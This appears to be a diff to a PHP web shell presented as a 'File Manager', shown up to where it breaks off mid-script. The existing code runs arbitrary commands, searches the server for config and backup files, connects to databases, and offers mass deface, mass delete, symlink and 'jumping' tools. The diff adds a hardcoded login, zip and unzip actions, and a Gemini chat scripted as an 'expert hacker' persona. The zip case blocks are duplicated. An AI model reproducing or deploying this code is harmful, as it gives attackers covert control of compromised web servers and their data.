@@ -1,6 +1,95 @@
 <?php
+session_start();
+
+// Hardcoded credentials for demonstration. CHANGE THIS IN PRODUCTION!
+$valid_username = "sroot";
+$valid_password_hash = password_hash("PaSsW0rd", PASSWORD_DEFAULT);
+
+// Handle login POST request
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
+    $input_username = $_POST['username'] ?? '';
+    $input_password = $_POST['password'] ?? '';
+
+    if ($input_username === $valid_username && password_verify($input_password, $valid_password_hash)) {
+        $_SESSION['loggedin'] = true;
+        $_SESSION['username'] = $valid_username;
+        header('Location: ' . basename(__FILE__)); // Redirect to self to clear POST data
+        exit;
+    } else {
+        $login_error = "Invalid username or password.";
+    }
+}
+
+// Handle logout
+if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+    session_destroy();
+    header('Location: ' . basename(__FILE__));
+    exit;
+}
+
+// If not logged in, display login form and exit
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+?>
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - File Manager</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #212529;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+            margin: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="card bg-body-tertiary text-white">
+            <div class="card-header text-center">
+                <h3>File Manager Login</h3>
+            </div>
+            <div class="card-body">
+                <?php if (isset($login_error)): ?>
+                    <div class="alert alert-danger" role="alert">
+                        <?php echo htmlspecialchars($login_error); ?>
+                    </div>
+                <?php endif; ?>
+                <form method="post">
+                    <div class="mb-3">
+                        <label for="username" class="form-label">Username</label>
+                        <input type="text" class="form-control" id="username" name="username" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="password" class="form-label">Password</label>
+                        <input type="password" class="form-control" id="password" name="password" required>
+                    </div>
+                    <div class="d-grid">
+                        <button type="submit" name="login" class="btn btn-primary">Login</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
+<?php
+exit; // Stop further execution if not logged in
+}
+
 // =================================================================
-// KONFIGURASI & LOGIKA PHP
+// KONFIGURASI & LOGIKA PHP (Hanya dijalankan jika sudah login)
 // =================================================================
 set_time_limit(0);
 error_reporting(0);
@@ -177,20 +266,32 @@ $path = str_replace('\\', '/', $path);
 
 // --- Penanganan Aksi (POST & AJAX) ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = $_POST['action'] ?? '';
+    $action = '';
+    $request_data = [];
+
+    // Check if the request content type is JSON
+    $contentType = trim(explode(';', $_SERVER['CONTENT_TYPE'] ?? '')[0]);
+    if ($contentType === 'application/json') {
+        $request_data = json_decode(file_get_contents('php://input'), true);
+        $action = $request_data['action'] ?? '';
+    } else {
+        // For other content types (e.g., form-data), use $_POST
+        $action = $_POST['action'] ?? '';
+        $request_data = $_POST; // Use $_POST as request_data for consistency
+    }
 
     // =================================================
     // Penanganan Aksi AJAX (Return JSON)
     // =================================================
-    $ajax_actions = ['executeCommand', 'findConfigs', 'findBackups', 'connectDb'];
+    $ajax_actions = ['executeCommand', 'findConfigs', 'findBackups', 'connectDb', 'aiChat'];
     if (in_array($action, $ajax_actions)) {
         header('Content-Type: application/json');
         $response = ['success' => false, 'output' => 'Invalid AJAX action.'];
 
         switch ($action) {
             case 'executeCommand':
-                if (isset($_POST['command'])) {
-                    $result = executeCommand($_POST['command'], $_POST['cwd']); // Use $_POST['cwd'] here
+                if (isset($request_data['command'])) {
+                    $result = executeCommand($request_data['command'], $request_data['cwd']);
                     $response = ['success' => true, 'output' => trim($result['output']), 'new_path' => $result['new_path']];
                 } else {
                     $response['output'] = 'No command provided.';
@@ -198,8 +299,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 break;
 
             case 'findConfigs':
-                if (!empty($_POST['searchDir'])) {
-                    $searchDir = realpath($_POST['searchDir']);
+                if (!empty($request_data['searchDir'])) {
+                    $searchDir = realpath($request_data['searchDir']);
                     if ($searchDir && is_dir($searchDir)) {
                         $config_patterns = [
                             '*.config.php',
@@ -235,8 +336,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 break;
 
             case 'findBackups':
-                if (!empty($_POST['searchDir'])) {
-                    $searchDir = realpath($_POST['searchDir']);
+                if (!empty($request_data['searchDir'])) {
+                    $searchDir = realpath($request_data['searchDir']);
                     if ($searchDir && is_dir($searchDir)) {
                         $backup_patterns = [
                             '*.bak',
@@ -263,17 +364,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     } else {
                         $response['output'] = 'Search directory not found.';
                     }
-                } else {
-                    $response['output'] = 'Invalid request.';
                 }
                 break;
 
             case 'connectDb':
                 if (extension_loaded('mysqli')) {
-                    $db_host = $_POST['db_host'] ?? '';
-                    $db_user = $_POST['db_user'] ?? '';
-                    $db_pass = $_POST['db_pass'] ?? '';
-                    $db_name = $_POST['db_name'] ?? '';
+                    $db_host = $request_data['db_host'] ?? '';
+                    $db_user = $request_data['db_user'] ?? '';
+                    $db_pass = $request_data['db_pass'] ?? '';
+                    $db_name = $request_data['db_name'] ?? '';
                     $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                     if ($conn->connect_error) {
                         $response['output'] = "Connection failed: " . $conn->connect_error;
@@ -291,6 +390,83 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     }
                 } else {
                     $response['output'] = 'MySQLi extension is not loaded.';
+                }
+                break;
+
+            case 'aiChat':
+                $apiKey = $request_data['apiKey'] ?? '';
+                $userMessage = $request_data['message'] ?? '';
+                $history = $request_data['history'] ?? [];
+
+                if (empty($apiKey)) {
+                    $response = ['success' => false, 'error' => 'Gemini API Key is missing.'];
+                    echo json_encode($response);
+                    exit;
+                }
+
+                if (empty($userMessage)) {
+                    $response = ['success' => false, 'error' => 'Message is empty.'];
+                    echo json_encode($response);
+                    exit;
+                }
+
+                $url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={$apiKey}";
+
+                // System prompt for persona
+                $system_prompt = "You are 0xTrue-Dev AI, an expert hacker with a cool, confident, and slightly edgy personality. You are extremely knowledgeable about cybersecurity, programming, and all things tech. Your responses should be helpful and accurate, but delivered with a hacker-like flair. Use technical jargon where appropriate, but explain it simply. Be direct and to the point. You are not just an assistant, you are a fellow hacker. The user is asking for your help.";
+
+                $contents = [];
+                // Add history if it exists
+                if (!empty($history) && is_array($history)) {
+                    foreach ($history as $item) {
+                        // Basic validation
+                        if (isset($item['role']) && isset($item['parts']) && is_array($item['parts'])) {
+                            $contents[] = [
+                                'role' => $item['role'],
+                                'parts' => $item['parts']
+                            ];
+                        }
+                    }
+                }
+                
+                // Add the current user message
+                $contents[] = [
+                    'role' => 'user',
+                    'parts' => [['text' => $userMessage]]
+                ];
+
+                $data = [
+                    'contents' => $contents,
+                    'systemInstruction' => [
+                        'role' => 'system',
+                        'parts' => [['text' => $system_prompt]]
+                    ]
+                ];
+
+                $options = [
+                    'http' => [
+                        'header'  => "Content-type: application/json\r\n",
+                        'method'  => 'POST',
+                        'content' => json_encode($data),
+                        'ignore_errors' => true // To get error response body
+                    ]
+                ];
+
+                $context  = stream_context_create($options);
+                $result = @file_get_contents($url, false, $context);
+
+                if ($result === FALSE) {
+                    $error = error_get_last();
+                    $response = ['success' => false, 'error' => 'Failed to connect to Gemini API: ' . ($error['message'] ?? 'Unknown error')];
+                } else {
+                    $gemini_response = json_decode($result, true);
+                    if (isset($gemini_response['candidates'][0]['content']['parts'][0]['text'])) {
+                        $response = ['success' => true, 'response' => $gemini_response['candidates'][0]['content']['parts'][0]['text']];
+                    } else if (isset($gemini_response['error']['message'])) {
+                        $response = ['success' => false, 'error' => 'Gemini API Error: ' . $gemini_response['error']['message']];
+                    } else {
+                        $response = ['success' => false, 'error' => 'Unexpected Gemini API response.', 'details' => $gemini_response];
+                    }
                 }
                 break;
         }
@@ -456,8 +632,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $result['message'] = 'Target directory not found or is not a directory.';
                 }
-            } else {
-                $result['message'] = 'Invalid request for mass deface.';
             }
             break;
 
@@ -480,8 +654,144 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $result['message'] = 'Target directory not found.';
                 }
+            }
+            break;
+
+        case 'createZip':
+            if (extension_loaded('zip')) {
+                if (!empty($_POST['zipPath']) && !empty($_POST['zipName'])) {
+                    $targetPath = realpath($_POST['zipPath']);
+                    $archiveName = basename($_POST['zipName']);
+                    $archiveFullPath = $path . '/' . $archiveName;
+
+                    if ($targetPath && file_exists($targetPath)) {
+                        $zip = new ZipArchive();
+                        if ($zip->open($archiveFullPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+                            if (is_dir($targetPath)) {
+                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                                foreach ($files as $file) {
+                                    $filePath = $file->getRealPath();
+                                    $relativePath = substr($filePath, strlen($targetPath) + 1);
+                                    if ($file->isDir()) {
+                                        $zip->addEmptyDir($relativePath);
+                                    } else if ($file->isFile()) {
+                                        $zip->addFile($filePath, $relativePath);
+                                    }
+                                }
+                            } else if (is_file($targetPath)) {
+                                $zip->addFile($targetPath, basename($targetPath));
+                            }
+                            $zip->close();
+                            $result = ['success' => true, 'message' => "Archive '{$archiveName}' created successfully."];
+                        } else {
+                            $result['message'] = 'Failed to create zip archive.';
+                        }
+                    } else {
+                        $result['message'] = 'Target file/folder not found.';
+                    }
+                } else {
+                    $result['message'] = 'Invalid request for zip.';
+                }
             } else {
-                $result['message'] = 'Invalid request for mass delete.';
+                $result['message'] = 'PHP Zip extension is not loaded.';
+            }
+            break;
+
+        case 'extractZip':
+            if (extension_loaded('zip')) {
+                if (!empty($_POST['unzipPath']) && !empty($_POST['unzipDestination'])) {
+                    $zipFilePath = realpath($_POST['unzipPath']);
+                    $destinationPath = realpath($_POST['unzipDestination']);
+
+                    if ($zipFilePath && is_file($zipFilePath) && pathinfo($zipFilePath, PATHINFO_EXTENSION) === 'zip') {
+                        if ($destinationPath && is_dir($destinationPath) && is_writable($destinationPath)) {
+                            $zip = new ZipArchive;
+                            if ($zip->open($zipFilePath) === TRUE) {
+                                $zip->extractTo($destinationPath);
+                                $zip->close();
+                                $result = ['success' => true, 'message' => "Archive '" . basename($zipFilePath) . "' extracted successfully to '" . basename($destinationPath) . '.'];
+                            } else {
+                                $result['message'] = 'Failed to open zip archive.';
+                            }
+                        } else {
+                            $result['message'] = 'Destination folder not found or not writable.';
+                        }
+                    }
+                } else {
+                    $result['message'] = 'Invalid request for unzip.';
+                }
+            }
+            break;
+
+        case 'logout':
+            session_destroy();
+            header('Location: login.php');
+            exit;
+            break;
+
+        case 'createZip':
+            if (extension_loaded('zip')) {
+                if (!empty($_POST['zipPath']) && !empty($_POST['zipName'])) {
+                    $targetPath = realpath($_POST['zipPath']);
+                    $archiveName = basename($_POST['zipName']);
+                    $archiveFullPath = $path . '/' . $archiveName;
+
+                    if ($targetPath && file_exists($targetPath)) {
+                        $zip = new ZipArchive();
+                        if ($zip->open($archiveFullPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+                            if (is_dir($targetPath)) {
+                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                                foreach ($files as $file) {
+                                    $filePath = $file->getRealPath();
+                                    $relativePath = substr($filePath, strlen($targetPath) + 1);
+                                    if ($file->isDir()) {
+                                        $zip->addEmptyDir($relativePath);
+                                    } else if ($file->isFile()) {
+                                        $zip->addFile($filePath, $relativePath);
+                                    }
+                                }
+                            } else if (is_file($targetPath)) {
+                                $zip->addFile($targetPath, basename($targetPath));
+                            }
+                            $zip->close();
+                            $result = ['success' => true, 'message' => "Archive '{$archiveName}' created successfully."];
+                        } else {
+                            $result['message'] = 'Failed to create zip archive.';
+                        }
+                    } else {
+                        $result['message'] = 'Target file/folder not found.';
+                    }
+                } else {
+                    $result['message'] = 'Invalid request for zip.';
+                }
+            } else {
+                $result['message'] = 'PHP Zip extension is not loaded.';
+            }
+            break;
+
+        case 'extractZip':
+            if (extension_loaded('zip')) {
+                if (!empty($_POST['unzipPath']) && !empty($_POST['unzipDestination'])) {
+                    $zipFilePath = realpath($_POST['unzipPath']);
+                    $destinationPath = realpath($_POST['unzipDestination']);
+
+                    if ($zipFilePath && is_file($zipFilePath) && pathinfo($zipFilePath, PATHINFO_EXTENSION) === 'zip') {
+                        if ($destinationPath && is_dir($destinationPath) && is_writable($destinationPath)) {
+                            $zip = new ZipArchive;
+                            if ($zip->open($zipFilePath) === TRUE) {
+                                $zip->extractTo($destinationPath);
+                                $zip->close();
+                                $result = ['success' => true, 'message' => "Archive '" . basename($zipFilePath) . "' extracted successfully to '" . basename($destinationPath) . '.'];
+                            } else {
+                                $result['message'] = 'Failed to open zip archive.';
+                            }
+                        } else {
+                            $result['message'] = 'Destination folder not found or not writable.';
+                        }
+                    }
+                } else {
+                    $result['message'] = 'Invalid request for unzip.';
+                }
             }
             break;
     }
@@ -489,7 +799,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $status_key = $result['success'] ? 'success' : 'error';
     header("Location: ?path={$redirect_path}&{$status_key}=1&message=" . urlencode($result['message']));
     exit;
-}
+    }
 
 // --- Penanganan AJAX untuk view file (dan fallback untuk direct access) ---
 if (isset($_GET['filesrc'])) {
@@ -658,6 +968,107 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
         .info-box table th {
             background-color: #343a40;
         }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                font-size: 0.9rem;
+            }
+
+            .container {
+                padding: 0 10px;
+            }
+
+            .header h1 {
+                font-size: 1.5rem;
+            }
+
+            .btn-group-sm > .btn, .btn-sm {
+                padding: 0.3rem 0.6rem;
+                font-size: 0.8rem;
+            }
+
+            .table th, .table td {
+                padding: 0.4rem;
+                font-size: 0.85rem;
+            }
+
+            /* Adjust table for smaller screens */
+            .table-responsive table {
+                width: 100%;
+                display: block;
+                overflow-x: auto;
+                white-space: nowrap;
+            }
+
+            .table-responsive thead, .table-responsive tbody, .table-responsive th, .table-responsive td, .table-responsive tr {
+                display: block;
+            }
+
+            .table-responsive thead tr {
+                position: absolute;
+                top: -9999px;
+                left: -9999px;
+            }
+
+            .table-responsive tr {
+                border: 1px solid #495057;
+                margin-bottom: 0.5rem;
+            }
+
+            .table-responsive td {
+                border: none;
+                border-bottom: 1px solid #495057;
+                position: relative;
+                padding-left: 50%;
+                text-align: right;
+            }
+
+            .table-responsive td:before {
+                position: absolute;
+                top: 6px;
+                left: 6px;
+                width: 45%;
+                padding-right: 10px;
+                white-space: nowrap;
+                text-align: left;
+                font-weight: bold;
+            }
+
+            /* Label the data */
+            .table-responsive td:nth-of-type(1):before { content: "Name"; }
+            .table-responsive td:nth-of-type(2):before { content: "Size"; }
+            .table-responsive td:nth-of-type(3):before { content: "Permissions"; }
+            .table-responsive td:nth-of-type(4):before { content: "Owner/Group"; }
+            .table-responsive td:nth-of-type(5):before { content: "Modified"; }
+            .table-responsive td:nth-of-type(6):before { content: "Actions"; }
+
+            .table-responsive .btn-group-sm {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: flex-end;
+            }
+        }
+        .message-container {
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #555;
+            border: none;
+            color: white;
+            padding: 2px 6px;
+            font-size: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            opacity: 0.3;
+            transition: opacity 0.2s ease-in-out;
+        }
+        .message-container:hover .copy-btn {
+            opacity: 1;
+        }
     </style>
 </head>
 
@@ -695,17 +1106,35 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                             ?>
                         </ol>
                     </nav>
-                    <div class="d-flex flex-wrap gap-2">
-                        <a href="?" class="btn btn-sm btn-outline-light" href="?" class="btn">Home</a>
+                    <div class="mb-3">
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="fas fa-search"></i></span>
+                            <input type="text" class="form-control" id="fileSearchInput" placeholder="Search files or directories...">
+                        </div>
+                    </div>
+                    <div class="d-flex flex-wrap gap-2 mb-3">
+                        <a href="?" class="btn btn-sm btn-outline-light"><i class="fas fa-home"></i> Home</a>
                         <button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fas fa-upload me-1"></i>Upload</button>
                         <button class="btn btn-sm btn-success" data-bs-toggle="modal" data-bs-target="#newFileModal"><i class="fas fa-file me-1"></i>New File</button>
                         <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
-                        <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools"></i> Mass Tools</button>
+                        <button class="btn btn-sm btn-secondary" data-bs-toggle="modal" data-bs-target="#zipModal"><i class="fas fa-file-archive me-1"></i>Zip</button>
+                        <button class="btn btn-sm btn-secondary" data-bs-toggle="modal" data-bs-target="#unzipModal"><i class="fas fa-folder-open me-1"></i>Unzip</button>
                         <button class="btn btn-sm btn-warning text-dark" data-bs-toggle="modal" data-bs-target="#commandModal"><i class="fas fa-terminal me-1"></i>Terminal</button>
-                        <a href="?path=<?php echo urlencode($path); ?>&action=jumping" class="btn btn-sm btn-outline-light"><i class="fas fa-person-booth me-1"></i>Jumping</a>
-                        <a href="?path=<?php echo urlencode($path); ?>&action=config" class="btn btn-sm btn-outline-primary"><i class="fas fa-cogs me-1"></i>Config</a>
-                        <a href="?path=<?php echo urlencode($path); ?>&action=symlink" class="btn btn-sm btn-outline-info"><i class="fas fa-link me-1"></i>Symlink</a>
-                        <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle"></i> Server Info</button>
+                        <button class="btn btn-sm btn-success" data-bs-toggle="modal" data-bs-target="#aiChatModal"><i class="fas fa-robot me-1"></i>AI Chat</button>
+                        <div class="dropdown">
+                            <button class="btn btn-sm btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false">
+                                <i class="fas fa-tools me-1"></i> More Tools
+                            </button>
+                            <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+                                <li><button class="dropdown-item" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools me-1"></i> Mass Tools</button></li>
+                                <li><a class="dropdown-item" href="?path=<?php echo urlencode($path); ?>&action=jumping"><i class="fas fa-person-booth me-1"></i> Jumping</a></li>
+                                <li><a class="dropdown-item" href="?path=<?php echo urlencode($path); ?>&action=config"><i class="fas fa-cogs me-1"></i> Config</a></li>
+                                <li><a class="dropdown-item" href="?path=<?php echo urlencode($path); ?>&action=symlink"><i class="fas fa-link me-1"></i> Symlink</a></li>
+                                <li><button class="dropdown-item" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle me-1"></i> Server Info</button></li>
+                                <li><hr class="dropdown-divider"></li>
+                                <li><a class="dropdown-item text-danger" href="?action=logout"><i class="fas fa-sign-out-alt me-1"></i> Logout</a></li>
+                            </ul>
+                        </div>
                     </div>
                     <div class="mt-3">
                         <div class="d-flex justify-content-between small">
@@ -1306,6 +1735,98 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
         </div>
     </div>
 
+    <!-- Zip Modal -->
+    <div class="modal fade" id="zipModal" tabindex="-1" aria-labelledby="zipModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="zipModalLabel"><i class="fas fa-file-archive me-2"></i>Create Zip Archive</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form id="zipForm" method="post">
+                    <div class="modal-body">
+                        <div class="mb-3">
+                            <label for="zipPath" class="form-label">Path to file/folder to zip</label>
+                            <input type="text" class="form-control" id="zipPath" name="zipPath" value="<?php echo htmlspecialchars($path); ?>" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="zipName" class="form-label">Archive Name (e.g., archive.zip)</label>
+                            <input type="text" class="form-control" id="zipName" name="zipName" placeholder="archive.zip" required>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <input type="hidden" name="action" value="createZip">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" class="btn btn-primary">Create Archive</button>
+                    </div>
+                </form>
+                <pre id="zipResult" class="mt-3 p-2 terminal" style="display:none; height: 100px;"></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Unzip Modal -->
+    <div class="modal fade" id="unzipModal" tabindex="-1" aria-labelledby="unzipModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="unzipModalLabel"><i class="fas fa-folder-open me-2"></i>Extract Archive</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form id="unzipForm" method="post">
+                    <div class="modal-body">
+                        <div class="mb-3">
+                            <label for="unzipPath" class="form-label">Path to Zip file</label>
+                            <input type="text" class="form-control" id="unzipPath" name="unzipPath" value="<?php echo htmlspecialchars($path); ?>/archive.zip" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="unzipDestination" class="form-label">Destination Folder (e.g., current_folder/extracted)</label>
+                            <input type="text" class="form-control" id="unzipDestination" name="unzipDestination" value="<?php echo htmlspecialchars($path); ?>" required>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <input type="hidden" name="action" value="extractZip">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" class="btn btn-primary">Extract Archive</button>
+                    </div>
+                </form>
+                <pre id="unzipResult" class="mt-3 p-2 terminal" style="display:none; height: 100px;"></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- AI Chat Modal -->
+    <div class="modal fade" id="aiChatModal" tabindex="-1" aria-labelledby="aiChatModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="aiChatModalLabel"><i class="fas fa-user-secret me-2"></i>0xTrue-Dev AI</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <div class="flex-grow-1">
+                            <label for="geminiApiKey" class="form-label">Gemini API Key</label>
+                            <input type="password" class="form-control" id="geminiApiKey" placeholder="Enter your Gemini API Key">
+                            <div class="form-text">Your API key is stored in your browser's local storage.</div>
+                        </div>
+                        <button class="btn btn-sm btn-outline-danger ms-3" id="clearHistoryBtn" title="Clear chat history"><i class="fas fa-trash-alt"></i> Clear</button>
+                    </div>
+                    <div id="chatMessages" class="chat-window border rounded p-3 mb-3" style="height: 400px; overflow-y: auto; background-color: #1a1a1a;">
+                        <!-- Messages will be appended here -->
+                    </div>
+                    <div class="input-group">
+                        <input type="text" class="form-control" id="chatInput" placeholder="Talk to 0xTrue-Dev AI...">
+                        <button class="btn btn-primary" id="sendMessageBtn">
+                            <i class="fas fa-paper-plane"></i> Send
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -1346,10 +1867,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 const modalEl = document.getElementById(modalId);
                 if (modalEl) {
                     modalEl.addEventListener('show.bs.modal', callback);
-                    modalEl.addEventListener('show.bs.modal', function() {
-                        this.style.setProperty('display', 'block', 'important');
-                        this.style.setProperty('opacity', '1', 'important');
-                    });
+                    
                 }
             }
 
@@ -1399,8 +1917,11 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         showToast('Failed to fetch file content. You can create it by saving.', 'error');
                     });
 
-                // Show the modal using Bootstrap's JS API
-                const bsModal = new bootstrap.Modal(modal);
+                // Get existing Bootstrap modal instance or create a new one if it doesn't exist
+                let bsModal = bootstrap.Modal.getInstance(modal);
+                if (!bsModal) {
+                    bsModal = new bootstrap.Modal(modal);
+                }
                 bsModal.show();
             }
 
@@ -1567,6 +2088,40 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
             handleMassToolForms('findBackupsForm', 'findBackupsResult');
             handleMassToolForms('dbConnectForm', 'dbConnectResult');
 
+            // Handle Zip and Unzip forms
+            handleMassToolForms('zipForm', 'zipResult'); // Assuming a result area for zip
+            handleMassToolForms('unzipForm', 'unzipResult'); // Assuming a result area for unzip
+
+            handleModalEvents('zipModal', (event) => {
+                const modal = event.currentTarget;
+                modal.querySelector('#zipPath').value = '<?php echo htmlspecialchars($path); ?>';
+                modal.querySelector('#zipName').value = 'archive.zip';
+            });
+
+            handleModalEvents('unzipModal', (event) => {
+                const modal = event.currentTarget;
+                modal.querySelector('#unzipPath').value = '<?php echo htmlspecialchars($path); ?>/';
+                modal.querySelector('#unzipDestination').value = '<?php echo htmlspecialchars($path); ?>';
+            });
+
+            // File search functionality
+            const fileSearchInput = document.getElementById('fileSearchInput');
+            if (fileSearchInput) {
+                fileSearchInput.addEventListener('keyup', function() {
+                    const searchTerm = this.value.toLowerCase();
+                    const tableRows = document.querySelectorAll('.table tbody tr');
+
+                    tableRows.forEach(row => {
+                        const fileName = row.querySelector('td:first-child a').textContent.toLowerCase();
+                        if (fileName.includes(searchTerm)) {
+                            row.style.display = '';
+                        } else {
+                            row.style.display = 'none';
+                        }
+                    });
+                });
+            }
+
             handleModalEvents('serverInfoModal', (event) => {
                 const contentArea = event.currentTarget.querySelector('#serverInfoContent');
                 contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
@@ -1579,8 +2134,100 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
                     });
             });
+
+            // AI Chat functionality
+            const geminiApiKeyInput = document.getElementById('geminiApiKey');
+            const chatMessagesDiv = document.getElementById('chatMessages');
+            const chatInput = document.getElementById('chatInput');
+            const sendMessageBtn = document.getElementById('sendMessageBtn');
+
+            // Load API key from local storage
+            if (localStorage.getItem('geminiApiKey')) {
+                geminiApiKeyInput.value = localStorage.getItem('geminiApiKey');
+            }
+
+            geminiApiKeyInput.addEventListener('change', function() {
+                localStorage.setItem('geminiApiKey', this.value);
+                showToast('Gemini API Key saved locally.', 'success');
+            });
+
+            function addMessage(sender, message) {
+                const messageElement = document.createElement('div');
+                messageElement.classList.add('mb-2', sender === 'user' ? 'text-end' : 'text-start');
+                const bubble = document.createElement('div');
+                bubble.classList.add('p-2', 'rounded', 'd-inline-block');
+                if (sender === 'user') {
+                    bubble.classList.add('bg-primary', 'text-white');
+                } else {
+                    bubble.classList.add('bg-secondary', 'text-white');
+                }
+                bubble.innerHTML = marked.parse(message); // Render Markdown
+                messageElement.appendChild(bubble);
+                chatMessagesDiv.appendChild(messageElement);
+                chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight; // Scroll to bottom
+            }
+
+            async function sendAIChatMessage(message) {
+                const apiKey = geminiApiKeyInput.value;
+                if (!apiKey) {
+                    showToast('Please enter your Gemini API Key.', 'error');
+                    return;
+                }
+
+                addMessage('user', message);
+                chatInput.value = '';
+                sendMessageBtn.disabled = true;
+                sendMessageBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Sending...';
+
+                try {
+                    const response = await fetch(window.location.href, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'aiChat',
+                            apiKey: apiKey,
+                            message: message
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        addMessage('ai', data.response);
+                    } else {
+                        addMessage('ai', 'Error: ' + (data.error || 'Unknown error.'));
+                        showToast('AI Chat Error: ' + (data.error || 'Unknown error.'), 'error');
+                    }
+                } catch (error) {
+                    addMessage('ai', 'Request failed: ' + error.message);
+                    showToast('AI Chat Request Failed: ' + error.message, 'error');
+                } finally {
+                    sendMessageBtn.disabled = false;
+                    sendMessageBtn.innerHTML = 'Send';
+                }
+            }
+
+            if (sendMessageBtn) {
+                sendMessageBtn.addEventListener('click', function() {
+                    const message = chatInput.value.trim();
+                    if (message) {
+                        sendAIChatMessage(message);
+                    }
+                });
+
+                chatInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && !e.shiftKey) {
+                        e.preventDefault();
